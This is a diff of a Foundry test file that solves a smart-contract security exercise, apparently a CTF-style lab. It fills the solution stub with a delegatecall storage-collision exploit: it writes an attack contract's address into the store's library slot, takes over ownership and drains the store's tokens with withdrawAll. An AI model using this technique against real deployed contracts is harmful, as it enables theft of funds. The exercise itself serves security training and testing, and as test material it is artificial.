@@ -5,13 +5,13 @@ import "forge-std/Test.sol";
 import "forge-std/console.sol";
 import "src/utils/DummyERC20.sol";
 import "src/call-attacks-2/SecureStore.sol";
+import "src/call-attacks-2/AttackSecureStore.sol";
 import "src/call-attacks-2/RentingLibrary.sol";
 
 /**
  * @dev run "forge test -vvv --match-contract CA2"
  */
 contract TestCA2 is Test {
-
     uint256 constant INITIAL_SUPPLY = 100 ether;
     uint256 constant ATTACKER_INITIAL_BALANCE = 100 ether;
     uint256 constant STORE_INITIAL_BALANCE = 100_000 ether;
@@ -22,9 +22,9 @@ contract TestCA2 is Test {
     address attacker = makeAddr("attacker");
 
     RentingLibrary rentingLibrary;
-	DummyERC20 usdc;
-	SecureStore secureStore;
-    
+    DummyERC20 usdc;
+    SecureStore secureStore;
+
     function setUp() public {
         /* SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */
         vm.startPrank(deployer);
@@ -46,9 +46,29 @@ contract TestCA2 is Test {
     }
 
     function testCallAttack2() public {
-        /** CODE YOUR SOLUTION HERE */
-        
-        /** SUCCESS CONDITIONS - DON'T CHANGE ANYTHING HERE */
+        /**
+         * CODE YOUR SOLUTION HERE
+         */
+        vm.startPrank(attacker);
+        AttackSecureStore attackSecureStore = new AttackSecureStore();
+
+        uint256 requiredAmount = 1 * DAILY_RENT_PRICE;
+        usdc.approve(address(secureStore), requiredAmount * 2);
+
+        // add our attack contract's address into the rentingLibrary slot 0. Since it is waiting for uint we need to convert our address
+        secureStore.rentWarehouse(1, uint256(uint160(address(attackSecureStore))));
+
+        vm.warp(secureStore.rentedUntil() + 1 days);
+
+        // now the rentinglibrary is our attack contract we need to call it, and it will change the owner variable
+
+        secureStore.rentWarehouse(1, 666);
+
+        secureStore.withdrawAll();
+
+        /**
+         * SUCCESS CONDITIONS - DON'T CHANGE ANYTHING HERE
+         */
         assertEq(usdc.balanceOf(address(secureStore)), 0);
         assertEq(usdc.balanceOf(address(attacker)), ATTACKER_INITIAL_BALANCE + STORE_INITIAL_BALANCE);
     }
